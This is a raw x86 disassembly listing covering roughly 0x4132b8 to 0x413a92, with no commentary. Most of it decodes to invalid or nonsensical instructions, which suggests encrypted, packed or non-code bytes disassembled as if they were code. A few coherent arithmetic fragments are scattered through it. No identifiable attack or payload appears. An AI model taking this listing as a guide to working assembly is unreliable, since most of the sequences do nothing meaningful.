  4132b8:	and    al,0x4c
  4132ba:	fadd   DWORD PTR [edi-0x4cf72e13]
  4132c0:	pop    es
  4132c1:	jmp    0x3dc6c44b
  4132c6:	pop    edx
  4132c7:	cwde   
  4132c8:	xchg   edi,eax
  4132c9:	call   0x805e:0xd53561a3
  4132d0:	mov    dh,0xdb
  4132d2:	lods   al,BYTE PTR ds:[esi]
  4132d3:	in     eax,0xc1
  4132d5:	test   BYTE PTR [ecx-0x52d26689],al
  4132db:	out    0xca,al
  4132dd:	sub    ebp,edi
  4132df:	cmp    al,0x96
  4132e1:	loopne 0x4132ed
  4132e3:	mov    ah,0xb3
  4132e5:	mov    ebx,0x45cd7015
  4132ea:	or     al,0x10
  4132ec:	jbe    0x413337
  4132ee:	icebp  
  4132ef:	nop
  4132f0:	cmp    al,0x27
  4132f2:	and    cl,BYTE PTR [ebp+0x45129cdf]
  4132f8:	into   
  4132f9:	(bad)  
  4132fa:	push   ebx
  4132fb:	sti    
  4132fc:	es dec esp
  4132fe:	lea    ebp,[esi-0x16aa1a9f]
  413304:	aas    
  413305:	xchg   esi,eax
  413306:	unpcklps xmm0,xmm3
  413309:	test   BYTE PTR [edi],ch
  41330b:	add    al,0x79
  41330d:	and    DWORD PTR [ebx+0x2eb1de72],0xffffffb3
  413314:	xchg   ecx,eax
  413315:	ins    DWORD PTR es:[edi],dx
  413316:	lods   al,BYTE PTR ds:[esi]
  413317:	inc    edi
  413318:	cmp    al,0x89
  41331a:	ret    0x3ead
  41331d:	pop    ebp
  41331e:	add    DWORD PTR [ebx+0x6d538b83],edi
  413324:	dec    eax
  413325:	inc    edx
  413326:	add    DWORD PTR [ebx-0x76],eax
  413329:	sbb    ah,BYTE PTR [eax+0x11]
  41332c:	mov    esi,0xe3e72e91
  413331:	mov    bl,0x46
  413333:	call   0x2075cfa7
  413338:	rcl    BYTE PTR [esp+esi*2-0x5a39de64],0xb3
  413340:	jle    0x41335b
  413342:	ins    DWORD PTR es:[edi],dx
  413343:	js     0x413393
  413345:	mov    DWORD PTR [ebx-0x31],ecx
  413348:	jae    0x4132eb
  41334a:	jne    0x4132fd
  41334c:	ins    DWORD PTR es:[edi],dx
  41334d:	out    0xee,al
  41334f:	pop    ebx
  413350:	xor    bl,BYTE PTR [eax-0x5a31456c]
  413356:	stc    
  413357:	cmp    BYTE PTR [ecx-0x77],0x62
  41335b:	dec    edi
  41335c:	adc    eax,ecx
  41335e:	sub    cl,ch
  413360:	stos   BYTE PTR es:[edi],al
  413361:	inc    edx
  413362:	mov    ebx,0xa4b22bcf
  413367:	shl    DWORD PTR [ecx-0xf],1
  41336a:	es dec ecx
  41336c:	mov    ah,0xe1
  41336e:	push   0x4b
  413370:	sub    eax,0xc991d7dd
  413375:	in     eax,dx
  413376:	cmc    
  413377:	jne    0x413365
  413379:	in     al,dx
  41337a:	into   
  41337b:	mov    ebx,0xcbb80c0e
  413381:	rcr    dh,cl
  413383:	cmp    eax,0x3be3d586
  413388:	sub    edx,DWORD PTR [ebp-0xb]
  41338b:	pop    esi
  41338c:	push   es
  41338d:	repz mov bl,0x28
  413390:	outs   dx,DWORD PTR ds:[esi]
  413391:	out    dx,eax
  413392:	mov    cl,dl
  413394:	clc    
  413395:	dec    edi
  413396:	stos   BYTE PTR es:[edi],al
  413397:	mov    al,0xa2
  413399:	pop    edx
  41339a:	add    BYTE PTR [ebp-0x53],bl
  41339d:	es inc ebp
  41339f:	xor    eax,0x76e09521
  4133a4:	popa   
  4133a5:	xchg   ebx,eax
  4133a6:	aam    0x79
  4133a8:	jb     0x4133bb
  4133aa:	loope  0x413342
  4133ac:	bound  ebx,QWORD PTR ds:0x57803618
  4133b2:	hlt    
  4133b3:	jmp    0x4133e3
  4133b5:	and    eax,0xe69d9c21
  4133ba:	ja     0x413359
  4133bc:	inc    ebp
  4133bd:	push   ss
  4133be:	or     al,0xbb
  4133c0:	adc    al,0xb
  4133c2:	ss jnp 0x413405
  4133c5:	ins    BYTE PTR es:[edi],dx
  4133c6:	jmp    0x413431
  4133c8:	push   0x6b
  4133ca:	into   
  4133cb:	inc    edx
  4133cc:	loope  0x4133b2
  4133ce:	add    eax,DWORD PTR [ebx-0x56]
  4133d1:	lock mov ecx,DWORD PTR [edx+ebp*4+0x65faf04f]
  4133d9:	mov    ch,0xb7
  4133db:	in     eax,dx
  4133dc:	mov    ebx,DWORD PTR [edx]
  4133de:	test   ch,bl
  4133e0:	shl    cl,1
  4133e2:	inc    esp
  4133e3:	out    0xfc,al
  4133e5:	retf   
  4133e6:	xlat   BYTE PTR ds:[ebx]
  4133e7:	pop    esi
  4133e8:	jae    0x413449
  4133ea:	dec    edx
  4133eb:	sub    al,0x60
  4133ed:	lods   al,BYTE PTR ds:[esi]
  4133ee:	mov    esp,0xa40c163d
  4133f3:	jge    0x413468
  4133f5:	cmc    
  4133f6:	rcl    ah,1
  4133f8:	adc    BYTE PTR [esi],ch
  4133fa:	popf   
  4133fb:	or     eax,edi
  4133fd:	fistp  WORD PTR [eax-0x76024061]
  413403:	pushf  
  413404:	inc    ebx
  413405:	xor    cl,BYTE PTR [edi]
  413407:	ss jp  0x4133a7
  41340a:	lea    ebx,[ecx]
  41340c:	(bad)  
  41340d:	in     al,dx
  41340e:	loope  0x413471
  413410:	outs   dx,BYTE PTR ds:[esi]
  413411:	(bad)  
  413413:	fild   QWORD PTR [ecx+0x1c]
  413416:	sub    ah,BYTE PTR [edi+0x51]
  413419:	inc    eax
  41341a:	lds    esp,FWORD PTR [edx]
  41341c:	jbe    0x41341f
  41341e:	add    eax,0x417f1bd8
  413423:	mov    bh,0x23
  413425:	ret    
  413426:	cwde   
  413427:	enter  0xe97e,0x33
  41342b:	mov    ebp,0xc4f277a9
  413430:	and    dl,ch
  413432:	dec    eax
  413433:	adc    esp,edx
  413435:	daa    
  413436:	pop    esp
  413437:	mov    ?,WORD PTR ds:0x11940c37
  41343d:	loopne 0x413442
  41343f:	jge    0x41342d
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xd2872d5e
  41345f:	pop    esi
  413460:	inc    ebx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x4133fe
  413469:	xchg   edi,eax
  41346a:	mov    bh,BYTE PTR [edi+eax*8-0x29]
  41346e:	jge    0x4134ae
  413470:	ss outs dx,DWORD PTR fs:[esi]
  413473:	jecxz  0x41340c
  413475:	push   esi
  413476:	jbe    0x41343d
  413478:	dec    edi
  413479:	and    bl,0x2a
  41347c:	jg     0x413412
  41347e:	arpl   WORD PTR [edi-0x75],bx
  413481:	add    dl,dl
  413483:	imul   esi,DWORD PTR [ebx+0x1c],0xffffffe0
  413487:	loopne 0x413435
  413489:	leave  
  41348a:	push   esi
  41348b:	push   edx
  41348c:	push   esp
  41348d:	dec    ecx
  41348e:	out    dx,eax
  41348f:	call   0x4308:0xe6e55e11
  413496:	mov    ebp,0x912d7e2a
  41349b:	rcl    edi,1
  41349d:	sbb    al,BYTE PTR [ecx-0x2dabb685]
  4134a3:	imul   ebp
  4134a5:	inc    esp
  4134a6:	and    DWORD PTR [edx+ebx*1+0x43cb9aaf],edx
  4134ad:	ret    
  4134ae:	scas   eax,DWORD PTR es:[edi]
  4134af:	jg     0x413440
  4134b1:	lds    eax,FWORD PTR ds:0xb561f2
  4134b7:	adc    al,0xeb
  4134b9:	mov    BYTE PTR [edi-0x409b09c4],dl
  4134bf:	push   esi
  4134c0:	jb     0x4134aa
  4134c2:	imul   esi,DWORD PTR [ecx],0xffffffc2
  4134c5:	enter  0xb0c4,0x88
  4134c9:	fistp  DWORD PTR [ebp+0x3d9ea966]
  4134cf:	xchg   ebp,eax
  4134d0:	jmp    0x413455
  4134d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134d3:	call   0xfe2f:0x28bf3827
  4134da:	fadd   QWORD PTR [edi-0x37ace87e]
  4134e0:	jge    0x413540
  4134e2:	outs   dx,DWORD PTR ds:[esi]
  4134e3:	jns    0x41346f
  4134e5:	xor    eax,0x936af25e
  4134ea:	mov    al,0x39
  4134ec:	push   edi
  4134ed:	sbb    BYTE PTR ds:0xbcb33ba1,dh
  4134f3:	loop   0x413503
  4134f5:	sbb    BYTE PTR [eax+ebp*4],ch
  4134f8:	inc    ebx
  4134f9:	cmp    eax,0x1b39c054
  4134fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ff:	ret    0x20b2
  413502:	std    
  413503:	mov    al,0x54
  413505:	das    
  413506:	ss aad 0x47
  413509:	je     0x4134b3
  41350b:	mov    ebp,0x2f4d0fe0
  413510:	and    al,0xdf
  413512:	inc    ecx
  413513:	popf   
  413514:	xor    bh,bl
  413516:	aad    0xf
  413518:	imul   edx,ebp,0xc5a13ab2
  41351e:	hlt    
  41351f:	mov    ss,WORD PTR [ebp-0x38]
  413522:	sti    
  413523:	ss clc 
  413525:	or     DWORD PTR [ebx-0x6a],edi
  413528:	adc    al,0xd7
  41352a:	mov    ebx,0xa96190fd
  41352f:	retf   0xba91
  413532:	push   ecx
  413533:	pop    eax
  413534:	or     al,0x69
  413536:	mov    dh,BYTE PTR [edi+esi*8]
  413539:	ds xchg ebx,eax
  41353b:	in     al,dx
  41353c:	jnp    0x413502
  41353e:	jmp    0xda29f3b9
  413543:	jnp    0x4134eb
  413545:	fst    DWORD PTR [eax]
  413547:	and    dh,ah
  413549:	call   0x221627dd
  41354e:	lahf   
  41354f:	aas    
  413550:	rol    BYTE PTR [edx-0x6757e297],cl
  413556:	jmp    0xe900:0x58e56a56
  41355d:	scas   al,BYTE PTR es:[edi]
  41355e:	cmp    ah,ah
  413560:	push   ebp
  413561:	push   cs
  413562:	adc    BYTE PTR [edi-0x31743be5],bh
  413568:	jecxz  0x41356c
  41356a:	call   0x78be:0x5b943463
  413571:	js     0x413591
  413573:	cmp    eax,0xfd86b577
  413578:	popf   
  413579:	inc    ebx
  41357a:	sub    al,BYTE PTR [ecx+0x26]
  41357d:	sub    esi,DWORD PTR [ebx-0x49]
  413580:	je     0x4135fe
  413582:	stos   BYTE PTR es:[edi],al
  413583:	icebp  
  413584:	jg     0x41355c
  413586:	dec    ecx
  413587:	cmp    DWORD PTR [eax],ecx
  413589:	dec    ecx
  41358a:	push   cs
  41358b:	(bad)  
  41358c:	out    dx,al
  41358d:	cmp    bl,bl
  41358f:	sub    BYTE PTR [esi-0x77],dh
  413592:	mov    ah,0xcf
  413594:	fs mov al,0xc3
  413597:	out    0x2a,eax
  413599:	cmp    al,0xf9
  41359b:	and    ebp,DWORD PTR [eax-0x35]
  41359e:	bound  eax,QWORD PTR [eax+ebx*2]
  4135a1:	pop    esi
  4135a2:	pop    esi
  4135a3:	mov    ecx,0x8716b16e
  4135a8:	outs   dx,DWORD PTR ds:[esi]
  4135a9:	mov    ds:0xa7438424,eax
  4135ae:	or     al,0xbc
  4135b0:	mov    dl,0xdd
  4135b2:	jl     0x41359d
  4135b4:	jle    0x41361e
  4135b6:	push   esi
  4135b7:	push   ds
  4135b8:	scas   al,BYTE PTR es:[edi]
  4135b9:	fcom   DWORD PTR [ecx]
  4135bb:	(bad)  
  4135bc:	or     DWORD PTR [eax+0x569b18],edx
  4135c2:	mov    ds:0x18dfc6b1,al
  4135c7:	xchg   edx,eax
  4135c8:	ds daa 
  4135ca:	pusha  
  4135cb:	adc    eax,DWORD PTR [eax+eax*2+0x74877195]
  4135d2:	push   ebx
  4135d3:	push   edi
  4135d4:	jecxz  0x413619
  4135d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135d7:	dec    edi
  4135d8:	sbb    eax,0x2777a399
  4135dd:	mov    al,ds:0xb919eb6b
  4135e2:	dec    edx
  4135e3:	pop    esp
  4135e4:	cmp    DWORD PTR [ecx-0x563804c4],esp
  4135ea:	(bad)  
  4135eb:	mov    bl,0x89
  4135ed:	pusha  
  4135ee:	mov    cl,0xd4
  4135f0:	or     edx,ebx
  4135f2:	pop    ebx
  4135f3:	out    dx,eax
  4135f4:	jmp    0x413657
  4135f6:	inc    eax
  4135f7:	aam    0x6c
  4135f9:	mov    dh,0xcd
  4135fb:	jecxz  0x413586
  4135fd:	stos   BYTE PTR es:[edi],al
  4135fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ff:	add    DWORD PTR [ebx+esi*2+0x2a],eax
  413603:	adc    BYTE PTR ds:0x78657081,0x9a
  41360a:	cld    
  41360b:	imul   edx,DWORD PTR [eax],0x32
  41360e:	sub    eax,0x7af57e63
  413613:	jnp    0x41366e
  413615:	dec    ebp
  413616:	jno    0x41363d
  413618:	lahf   
  413619:	dec    edi
  41361a:	pushf  
  41361b:	icebp  
  41361c:	jo     0x4135a4
  41361e:	jecxz  0x413695
  413620:	sub    cl,dh
  413622:	inc    ebp
  413623:	sbb    al,0x9a
  413625:	inc    eax
  413626:	jp     0x4135f1
  413628:	rcr    DWORD PTR [edi-0x73],0xa9
  41362c:	addr16 push cs
  41362e:	inc    ecx
  41362f:	mov    edx,0x3cfaebaf
  413634:	sbb    BYTE PTR [eax-0x346fe97d],dl
  41363a:	sub    edi,DWORD PTR [ecx-0x71]
  41363d:	jae    0x413699
  41363f:	add    eax,0x95a04db3
  413644:	arpl   WORD PTR [ebp+0x63],ax
  413647:	popa   
  413648:	test   DWORD PTR [edx-0x2acc82d8],esp
  41364e:	sbb    ebp,ecx
  413650:	(bad)  
  413651:	bound  eax,QWORD PTR [ecx-0x25]
  413654:	push   ebx
  413655:	out    dx,eax
  413656:	leave  
  413657:	adc    al,0xa6
  413659:	imul   ecx,DWORD PTR [edi+esi*4],0xffffff9f
  41365d:	pop    esp
  41365e:	jp     0x4136a0
  413660:	sbb    DWORD PTR [ecx],esi
  413662:	cmc    
  413663:	int    0x5a
  413665:	xchg   edx,eax
  413666:	jns    0x413645
  413668:	fisttp QWORD PTR [edx+0x54637ea2]
  41366e:	jl     0x4136ab
  413670:	jns    0x4136d7
  413672:	scas   al,BYTE PTR es:[edi]
  413673:	sub    BYTE PTR [ebx+edi*8+0x7dad8b39],bl
  41367a:	fstp   DWORD PTR [ecx]
  41367c:	das    
  41367d:	dec    esp
  41367e:	fimul  DWORD PTR [eax+0x5b]
  413681:	shr    BYTE PTR [ebx+0x12],0xd1
  413685:	out    0xc3,eax
  413687:	cs jg  0x41368a
  41368a:	ins    BYTE PTR es:[edi],dx
  41368b:	mov    dl,0x62
  41368d:	or     DWORD PTR [ecx-0x34],edx
  413690:	into   
  413691:	mov    ch,0x2e
  413693:	jl     0x41370e
  413695:	push   eax
  413696:	jnp    0x4136f7
  413698:	mov    ecx,0x84460463
  41369d:	call   0xd3f3:0x9dededda
  4136a4:	jae    0x41371a
  4136a6:	hlt    
  4136a7:	iret   
  4136a8:	cmp    cl,bh
  4136aa:	call   0xa5c75035
  4136af:	jno    0x413664
  4136b1:	xlat   BYTE PTR ds:[ebx]
  4136b2:	into   
  4136b3:	adc    edx,eax
  4136b5:	xor    BYTE PTR [edx-0x3],al
  4136b8:	test   DWORD PTR [esi-0x2c],0xcf57ca8a
  4136bf:	(bad)  
  4136c0:	xchg   ebx,eax
  4136c1:	mov    ebx,0x424456de
  4136c6:	jnp    0x4136aa
  4136c8:	lea    eax,[ebx]
  4136ca:	pop    esi
  4136cb:	push   0x58
  4136cd:	cs inc esp
  4136cf:	lahf   
  4136d0:	pushf  
  4136d1:	sti    
  4136d2:	call   0x8bfd8c62
  4136d7:	jge    0x4136cd
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x2e2e8de7]
  4136f4:	pop    ds
  4136f5:	ja     0x41371f
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x41368f
  4136ff:	nop
  413700:	fisub  WORD PTR [edx]
  413702:	sbb    BYTE PTR [edx+0x6a],cl
  413705:	push   0xa
  413707:	sbb    DWORD PTR [ecx+eax*2+0x76],0x98a33ba0
  41370f:	inc    edi
  413710:	or     al,0x72
  413712:	ja     0x41377f
  413714:	mov    dh,0xcd
  413716:	push   esi
  413717:	aas    
  413718:	ja     0x413794
  41371a:	pop    ss
  41371b:	jle    0x4136fe
  41371d:	push   es
  41371e:	lock ja 0x413705
  413721:	jmp    0x689fe659
  413726:	mov    ah,0x5a
  413728:	call   0xe8df:0x274e0cf1
  41372f:	repnz xchg ebp,eax
  413731:	fsub   DWORD PTR [edi+0x5ea5ce81]
  413737:	(bad)  
  413738:	pop    edi
  413739:	sub    DWORD PTR [edx],0x1452f10
  41373f:	std    
  413740:	add    al,0x45
  413742:	jne    0x4136d2
  413744:	(bad)  
  413745:	bound  ebx,QWORD PTR [eax+0x7964c230]
  41374b:	push   esi
  41374c:	mov    eax,ds:0x3b3466cb
  413751:	sbb    esi,eax
  413753:	stc    
  413754:	fwait
  413755:	push   0x746130df
  41375a:	add    DWORD PTR [ecx],esi
  41375c:	out    dx,eax
  41375d:	sbb    BYTE PTR [edx-0x505cd0a9],cl
  413763:	mov    al,ds:0x8a613a2d
  413768:	ds cdq 
  41376a:	lods   al,BYTE PTR ds:[esi]
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	xchg   edx,eax
  41376d:	lock push es
  41376f:	ret    0x5fdf
  413772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413773:	cs mov ah,0xb
  413776:	das    
  413777:	sbb    cl,bl
  413779:	cmp    DWORD PTR ds:0xc5a74d29,ebp
  41377f:	out    dx,al
  413780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413781:	data16 add dh,cl
  413784:	(bad)  
  413786:	int    0xc1
  413788:	sub    BYTE PTR [ecx-0x442b79c7],al
  41378e:	adc    eax,0xe4186562
  413793:	sar    BYTE PTR [edi-0x488c8c39],cl
  413799:	fcmovbe st,st(0)
  41379b:	xor    al,0x94
  41379d:	adc    ah,BYTE PTR [edi]
  41379f:	in     eax,dx
  4137a0:	jbe    0x41373a
  4137a2:	cmp    BYTE PTR [ebx],al
  4137a4:	int    0x24
  4137a6:	test   eax,0x217acf19
  4137ab:	mov    ds:0xb8f0dde4,eax
  4137b0:	repnz add BYTE PTR [ecx],ch
  4137b3:	div    DWORD PTR [esi-0x30]
  4137b6:	mov    ebx,0xcdfd1d10
  4137bb:	cli    
  4137bc:	fstp   QWORD PTR [esp+eax*4-0x67]
  4137c0:	xor    bh,bh
  4137c2:	inc    esi
  4137c3:	mov    eax,ds:0x161ada96
  4137c8:	cwde   
  4137c9:	addr16 aad 0x4b
  4137cc:	push   edi
  4137cd:	rcr    DWORD PTR [esi-0x5],1
  4137d0:	cmp    al,0xb
  4137d2:	pop    ecx
  4137d3:	pushf  
  4137d4:	addr16 inc ecx
  4137d6:	ret    0xf505
  4137d9:	pop    edx
  4137da:	daa    
  4137db:	sub    bh,BYTE PTR [eax]
  4137dd:	push   edi
  4137de:	and    DWORD PTR ds:0x24bb8405,ebx
  4137e4:	into   
  4137e5:	mov    ch,bh
  4137e7:	push   0x1177165a
  4137ec:	cmp    DWORD PTR [ebx-0x1ebaf77b],edx
  4137f2:	cmp    esp,DWORD PTR [edi-0x75f99781]
  4137f8:	scas   eax,DWORD PTR es:[edi]
  4137f9:	inc    eax
  4137fa:	call   0x621ad693
  4137ff:	sbb    BYTE PTR [ecx],ch
  413801:	push   0x87698d6a
  413806:	pop    esp
  413807:	daa    
  413808:	adc    ebx,DWORD PTR [eax-0x8]
  41380b:	dec    edx
  41380c:	ja     0x41380a
  41380e:	imul   ebp,DWORD PTR [esi+0x58],0xffffffd3
  413812:	outs   dx,DWORD PTR ds:[esi]
  413813:	push   0x81ce6b84
  413818:	loop   0x413818
  41381a:	out    0xce,eax
  41381c:	(bad)  
  41381e:	mov    cl,al
  413820:	jbe    0x4137fe
  413822:	and    dl,0xa1
  413825:	retf   
  413826:	dec    ebp
  413827:	xchg   ebp,eax
  413828:	test   DWORD PTR [ebp+0x4],esp
  41382b:	add    DWORD PTR [eax-0x39],ecx
  41382e:	push   DWORD PTR [ebx-0x10da959c]
  413834:	loopne 0x413829
  413836:	(bad)  
  413837:	lds    esp,FWORD PTR gs:[ecx-0x19]
  41383b:	mov    eax,0xfd1d65f0
  413840:	sub    BYTE PTR [ebp-0x4623fc9c],al
  413846:	adc    DWORD PTR [ebx-0x44],eax
  413849:	je     0x4138a2
  41384b:	data16 sbb al,0x7f
  41384e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41384f:	pop    ebx
  413850:	icebp  
  413851:	cdq    
  413852:	jecxz  0x4137ed
  413854:	inc    ecx
  413855:	push   eax
  413856:	push   ds
  413857:	inc    esp
  413858:	pop    edi
  413859:	cwde   
  41385a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41385b:	loop   0x4138a7
  41385d:	shl    esi,cl
  41385f:	mov    ah,0x45
  413861:	stc    
  413862:	sub    al,0x4
  413864:	mov    edi,0xc0c499d7
  413869:	jb     0x413840
  41386b:	dec    esi
  41386c:	lahf   
  41386d:	jno    0x4137f8
  41386f:	std    
  413870:	retf   0xcff0
  413873:	and    BYTE PTR [ecx+0x26731e15],bl
  413879:	retf   0x6c21
  41387c:	arpl   WORD PTR [edx],bx
  41387e:	pop    DWORD PTR [ebp+0x72a52225]
  413884:	cs pop ebx
  413886:	pushf  
  413887:	fwait
  413888:	loopne 0x413831
  41388a:	dec    ebx
  41388b:	es aas 
  41388d:	inc    esp
  41388e:	aam    0xf6
  413890:	cmp    al,BYTE PTR [esi-0x6fbfd1ad]
  413896:	or     al,0x3f
  413898:	ins    BYTE PTR es:[edi],dx
  413899:	rcr    BYTE PTR [edi-0x6aa27e10],cl
  41389f:	pop    edx
  4138a0:	aam    0x6e
  4138a2:	push   0x89126c16
  4138a7:	inc    edx
  4138a8:	xchg   edx,eax
  4138a9:	fs stos DWORD PTR es:[edi],eax
  4138ab:	cmp    BYTE PTR [edx+0x649d659f],cl
  4138b1:	xchg   esi,eax
  4138b2:	(bad)  
  4138b3:	fiadd  WORD PTR [eax]
  4138b5:	lods   eax,DWORD PTR ds:[esi]
  4138b6:	lods   eax,DWORD PTR ds:[esi]
  4138b7:	jmp    0x8bb445bc
  4138bc:	push   esi
  4138bd:	cmp    eax,0xacbc1eda
  4138c2:	(bad)  
  4138c3:	mov    esi,0xf7be5dea
  4138c8:	out    0xfe,al
  4138ca:	mov    dh,0xc8
  4138cc:	inc    esp
  4138cd:	sbb    cl,0x71
  4138d0:	sub    DWORD PTR [ebp-0x38],edi
  4138d3:	and    esi,ebp
  4138d5:	aaa    
  4138d6:	mov    al,ds:0x15675645
  4138db:	stc    
  4138dc:	xlat   BYTE PTR ds:[ebx]
  4138dd:	pop    edi
  4138de:	cdq    
  4138df:	mov    ch,0x83
  4138e1:	popa   
  4138e2:	outs   dx,DWORD PTR ds:[esi]
  4138e3:	fsubr  DWORD PTR [esi-0x14e706f1]
  4138e9:	adc    eax,0xc96ed234
  4138ee:	push   ss
  4138ef:	add    DWORD PTR [eax-0x69963a7b],edx
  4138f5:	lods   al,BYTE PTR ds:[si]
  4138f7:	(bad)  
  4138f8:	loope  0x41395c
  4138fa:	retf   
  4138fb:	aam    0x4e
  4138fd:	outs   dx,BYTE PTR ds:[esi]
  4138fe:	jns    0x41396d
  413900:	ss pop ebx
  413902:	rol    esp,0x34
  413905:	lock pop eax
  413907:	xchg   ebp,eax
  413908:	push   es
  413909:	cld    
  41390a:	sub    BYTE PTR [bx+si],bh
  41390d:	fnstenv [esi+0x6b]
  413910:	bound  ecx,QWORD PTR [ecx]
  413912:	xlat   BYTE PTR ds:[ebx]
  413913:	xchg   esp,eax
  413914:	pop    eax
  413915:	sbb    al,0xae
  413917:	jmp    0x4138fe
  413919:	enter  0x806f,0xc0
  41391d:	and    ebx,0x67fbc9b
  413923:	cmp    BYTE PTR [ebx+0x1a24f77f],dl
  413929:	or     al,0x2c
  41392b:	cs and eax,0xa45ac369
  413931:	xor    BYTE PTR ds:0x1585149f,0xef
  413938:	sar    BYTE PTR [ebp+0x7deeac89],0x5
  41393f:	test   eax,0xde21fe71
  413944:	out    0x1,al
  413946:	daa    
  413947:	mov    eax,0x3c6827a5
  41394c:	shr    DWORD PTR [esi+0x29897684],0xf
  413953:	cmp    eax,0xd35628c9
  413958:	sub    BYTE PTR [ecx-0x7],dh
  41395b:	jno    0x413971
  41395d:	and    BYTE PTR [esi-0x45],0x89
  413961:	out    0x28,al
  413963:	popa   
  413964:	test   eax,0x4e4833fe
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139ed
  413996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413997:	out    0x7a,eax
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	mov    esp,0x2e3bfa83
  4139a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a7:	mov    ecx,ss
  4139a9:	sbb    ebx,esp
  4139ab:	loope  0x413999
  4139ad:	xor    edx,DWORD PTR ds:0x8cd0e299
  4139b3:	iret   
  4139b4:	or     eax,0x5845f8b9
  4139b9:	jle    0x413a14
  4139bb:	add    bh,ah
  4139bd:	sub    dl,ah
  4139bf:	mov    es,WORD PTR [eax]
  4139c1:	push   esi
  4139c2:	pusha  
  4139c3:	cmp    DWORD PTR [edx],ebx
  4139c5:	inc    esi
  4139c6:	adc    ah,ch
  4139c8:	and    al,0xbd
  4139ca:	ror    BYTE PTR ds:0xa51ee850,cl
  4139d0:	inc    ecx
  4139d1:	loop   0x41399e
  4139d3:	sti    
  4139d4:	lds    ebx,FWORD PTR [esi-0x21]
  4139d7:	xor    BYTE PTR [edx+ebx*8],dh
  4139da:	push   ebx
  4139db:	push   esi
  4139dc:	push   ebx
  4139dd:	fdiv   DWORD PTR [edi]
  4139df:	rol    BYTE PTR [ebp+0x18],cl
  4139e2:	xchg   edi,eax
  4139e3:	sbb    al,0x1c
  4139e5:	add    BYTE PTR [edx],0x68
  4139e8:	fsubrp st(5),st
  4139ea:	fcomp  DWORD PTR [edx-0x3dae758e]
  4139f0:	and    DWORD PTR [edx-0x37faf069],esi
  4139f6:	imul   ecx,DWORD PTR [ebx+edx*1+0x36dca968],0xb8ab9da0
  413a01:	push   edx
  413a02:	cmp    BYTE PTR [esi],bl
  413a04:	mov    DWORD PTR [ebx-0x7c57c2ed],edi
  413a0a:	inc    ecx
  413a0b:	les    edi,FWORD PTR [ecx-0x3b]
  413a0e:	repnz shr DWORD PTR [edi-0x23],cl
  413a12:	dec    edi
  413a13:	and    eax,DWORD PTR [eax]
  413a15:	test   DWORD PTR [ebp-0xa],ebp
  413a18:	fild   DWORD PTR [esi+0x390061aa]
  413a1e:	jge    0x4139a0
  413a20:	outs   dx,DWORD PTR ds:[esi]
  413a21:	aas    
  413a22:	sub    ebx,DWORD PTR [eax+0x1b5de4ac]
  413a28:	popf   
  413a29:	cwde   
  413a2a:	xor    al,0x12
  413a2c:	test   eax,0xca3344b9
  413a31:	mov    ecx,0xd403776b
  413a36:	mov    dl,0x37
  413a38:	shl    DWORD PTR [eax+0x65],cl
  413a3b:	pop    esp
  413a3c:	scas   eax,DWORD PTR es:[edi]
  413a3d:	push   ecx
  413a3e:	add    eax,0x1cf7f577
  413a43:	mov    dh,BYTE PTR [eax+ecx*4]
  413a46:	cmp    al,0xc1
  413a48:	and    eax,0x1353b3d0
  413a4d:	push   esi
  413a4e:	repz out dx,al
  413a50:	xchg   edx,eax
  413a51:	popf   
  413a52:	cwde   
  413a53:	(bad)  
  413a54:	lock iret 
  413a56:	ret    
  413a57:	jnp    0x413a85
  413a59:	cmc    
  413a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a5c:	pop    ds
  413a5d:	ret    0xb0
  413a60:	fiadd  DWORD PTR [eax]
  413a62:	aas    
  413a63:	mov    ecx,es
  413a65:	sbb    BYTE PTR [esi],0xd
  413a68:	xor    esi,DWORD PTR [ebx]
  413a6a:	sub    eax,DWORD PTR [eax]
  413a6c:	jmp    0x3fcd:0xbcd3df6f
  413a73:	xlat   BYTE PTR ds:[ebx]
  413a74:	sub    eax,0x30b55af2
  413a79:	add    esi,DWORD PTR [ecx-0x6c986272]
  413a7f:	xor    al,0xb9
  413a81:	gs jg  0x413ae0
  413a84:	sbb    DWORD PTR [ebp+eax*8+0x2b662cae],ebp
  413a8b:	add    bh,BYTE PTR [ecx-0x5fd841e9]
  413a91:	pop    ebx
  413a92:	or     dl,ah
